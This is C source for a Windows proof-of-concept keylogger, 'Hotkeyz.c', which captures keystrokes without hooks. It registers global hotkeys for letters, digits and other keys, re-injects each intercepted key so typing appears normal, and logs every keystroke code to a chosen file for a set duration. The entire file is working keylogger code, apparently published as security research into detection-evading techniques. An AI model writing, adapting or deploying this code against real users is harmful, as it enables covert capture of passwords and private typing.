/****************************************************************************************************
*                                                                                                   *
* File:         Hotkeyz.c                                                                           *
* Purpose:      Hotkeys-based keylogger proof-of-concept by @yo_yo_yo_jbo.                          *
*                                                                                                   *
*****************************************************************************************************/
#include <windows.h>
#include <stdio.h>

/****************************************************************************************************
*                                                                                                   *
* Macro:        DEBUG_MSG                                                                           *
* Purpose:      Creates a debug message.                                                            *
* Parameters:   - pwszFmt - the format string for the debug message.                                *
*               - ... - arguments for the format string message.                                    *
*                                                                                                   *
*****************************************************************************************************/
#ifdef _DEBUG
#define DEBUG_MSG(pwszFmt, ...)      (VOID)wprintf(L"%S: " pwszFmt L"\n", __FUNCTION__, __VA_ARGS__)
#else
#define DEBUG_MSG(pwszFmt, ...)
#endif

/****************************************************************************************************
*                                                                                                   *
* Constant:     POLL_TIME_MILLIS                                                                    *
* Purpose:      The number of milliseconds to poll for the next message.                            *
*                                                                                                   *
*****************************************************************************************************/
#define POLL_TIME_MILLIS (50)

/****************************************************************************************************
*                                                                                                   *
* Type:         VK_RANGE                                                                            *
* Purpose:      Container for a virtual-key range.                                                  *
*                                                                                                   *
*****************************************************************************************************/
typedef struct _VK_RANGE
{
	DWORD dwLoVk;
	DWORD dwHiVk;
} VK_RANGE;

/****************************************************************************************************
*                                                                                                   *
* Type:         CMDLINE_ARGS                                                                        *
* Purpose:      Specifies the commandline arguments.                                                *
*                                                                                                   *
*****************************************************************************************************/
typedef enum
{
	CMDLINE_ARG_KEYLOGGING_TIME_MILLISECONDS = 1,
	CMDLINE_ARG_FILEPATH,
	CMDLINE_ARG_MAX
} CMDLINE_ARGS;

/****************************************************************************************************
*                                                                                                   *
* Global:       g_atVkRanges                                                                        *
* Purpose:      Specifies the virtual-key ranges to be used by the keylogger.                       *
*                                                                                                   *
*****************************************************************************************************/
static
VK_RANGE
g_atVkRanges[] = {
	{ VK_BACK, VK_TAB },
	{ VK_RETURN, VK_RETURN },
	{ VK_SPACE, VK_SPACE },
	{ VK_INSERT, VK_DELETE },
	{ '0', '9' },
	{ 'A', 'Z' },
	{ VK_NUMPAD0, VK_DIVIDE }
};

/****************************************************************************************************
*                                                                                                   *
* Function:     keylogging_Run                                                                      *
* Purpose:      Runs the keylogger by registering hotkeys and intercepting them for a defined time. *
* Parameters:   - hFile - the file to write to.                                                     *
*				- dwTimeoutMilliseconds - the amount of milliseconds to perform keylogging.         *
* Returns:      TRUE upon success, FALSE otherwise.                                                 *
*                                                                                                   *
*****************************************************************************************************/
static
BOOL
keylogging_Run(
	HANDLE hFile,
	DWORD dwTimeoutMilliseconds
)
{
	BOOL bResult = FALSE;
	INT adwVkToIdMapping[256] = { 0 };
	SIZE_T nRangeCounter = 0;
	INT iCurrId = 0;
	DWORD nVkCounter = 0;
	MSG tMsg = { 0 };
	BYTE cCurrVk = 0;
	ULONGLONG ullBaseTickCount = 0;
	DWORD cbBytesWritten = 0;

	// Register all relevant virtual keys
	for (nRangeCounter = 0; nRangeCounter < ARRAYSIZE(g_atVkRanges); nRangeCounter++)
	{
		for (nVkCounter = g_atVkRanges[nRangeCounter].dwLoVk; nVkCounter <= g_atVkRanges[nRangeCounter].dwHiVk; nVkCounter++)
		{
			iCurrId++;
			if (!RegisterHotKey(NULL, iCurrId, 0, nVkCounter))
			{
				DEBUG_MSG(L"RegisterHotKey() failed (nVkCounter=%lu, LastError=%lu).", nVkCounter, GetLastError());
				goto lblCleanup;
			}
			adwVkToIdMapping[nVkCounter] = iCurrId;
		}
	}

	// Continously read messages
	ullBaseTickCount = GetTickCount64();
	while (GetTickCount64() - ullBaseTickCount < dwTimeoutMilliseconds)
	{
		// Get the message in a non-blocking manner and poll if necessary
		if (!PeekMessageW(&tMsg, NULL, WM_HOTKEY, WM_HOTKEY, PM_REMOVE))
		{
			Sleep(POLL_TIME_MILLIS);
			continue;
		}

		// Only handle hotkeys (should not really happen)
		if (WM_HOTKEY != tMsg.message)
		{
			continue;
		}

		// Get the key from the message
		cCurrVk = (BYTE)((((DWORD)tMsg.lParam) & 0xFFFF0000) >> 16);

		// Send the key to the OS and re-register
		(VOID)UnregisterHotKey(NULL, adwVkToIdMapping[cCurrVk]);
		keybd_event(cCurrVk, 0, 0, (ULONG_PTR)NULL);
		if (!RegisterHotKey(NULL, adwVkToIdMapping[cCurrVk], 0, cCurrVk))
		{
			adwVkToIdMapping[cCurrVk] = 0;
			DEBUG_MSG(L"RegisterHotKey() failed for re-registration (cCurrVk=%lu, LastError=%lu).", cCurrVk, GetLastError());
			goto lblCleanup;
		}

		// Write to the file
		if (!WriteFile(hFile, &cCurrVk, sizeof(cCurrVk), &cbBytesWritten, NULL))
		{
			DEBUG_MSG(L"WriteFile() failed (LastError=%lu).", GetLastError());
			goto lblCleanup;
		}

		// Validate everything was properly written
		if (sizeof(cCurrVk) != cbBytesWritten)
		{
			DEBUG_MSG(L"Was not able to write all data to file (cbBytesWritten=%lu).", cbBytesWritten);
			goto lblCleanup;
		}
	}

	// Success
	bResult = TRUE;

lblCleanup:

	// Unregister all registered hotkeys
	for (nVkCounter = 0; nVkCounter < ARRAYSIZE(adwVkToIdMapping); nVkCounter++)
	{
		if (0 != adwVkToIdMapping[nVkCounter])
		{
			(VOID)UnregisterHotKey(NULL, adwVkToIdMapping[nVkCounter]);
		}
	}

	// Return result
	return bResult;
}

/****************************************************************************************************
*                                                                                                   *
* Function:     wmain                                                                               *
* Purpose:      Main functionality.																	*
* Parameters:   - nArgc - the number of arguments - we expect one argument only, as per the usage.	*
*			    - ppwszArgv - the arguments - we expect one argument only, as per the usage.	    *
* Returns:      0 upon success, non-zero otherwise.                                                 *
*                                                                                                   *
*****************************************************************************************************/
INT
wmain(
	INT nArgc,
	PWSTR* ppwszArgv
)
{
	BOOL bResult = FALSE;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	WCHAR wszFilePath[MAX_PATH] = { 0 };
	DWORD dwKeyloggingTime = 0;

	// Validate number of arguments
	if (CMDLINE_ARG_MAX != nArgc)
	{
		DEBUG_MSG(L"Invalid number of commandline arguments.");
		goto lblCleanup;
	}

	// Get the keylogging time in milliseconds
	dwKeyloggingTime = (DWORD)_wtol(ppwszArgv[CMDLINE_ARG_KEYLOGGING_TIME_MILLISECONDS]);
	if (0 == dwKeyloggingTime)
	{
		DEBUG_MSG(L"Invalid commandline argument.");
		goto lblCleanup;
	}

	// Expand environment strings for the input file path
	if (0 == ExpandEnvironmentStringsW(ppwszArgv[CMDLINE_ARG_FILEPATH], wszFilePath, ARRAYSIZE(wszFilePath)))
	{
		DEBUG_MSG(L"ExpandEnvironmentStringsW() failed (LastError=%lu).", GetLastError());
		goto lblCleanup;
	}

	// Open the file for writing
	hFile = CreateFileW(wszFilePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		DEBUG_MSG(L"CreateFileW() failed (LastError=%lu).", GetLastError());
		goto lblCleanup;
	}

	// Run the keylogging functionality
	if (!keylogging_Run(hFile, dwKeyloggingTime))
	{
		DEBUG_MSG(L"keylogging_Run() failed.");
		goto lblCleanup;
	}

	// Flush the file (best-effort)
	(VOID)FlushFileBuffers(hFile);

	// Success
	bResult = TRUE;

lblCleanup:

	// Free resources
	if (INVALID_HANDLE_VALUE != hFile)
	{
		(VOID)CloseHandle(hFile);
		hFile = INVALID_HANDLE_VALUE;
	}

	// Return the result
	return bResult ? 0 : -1;
}
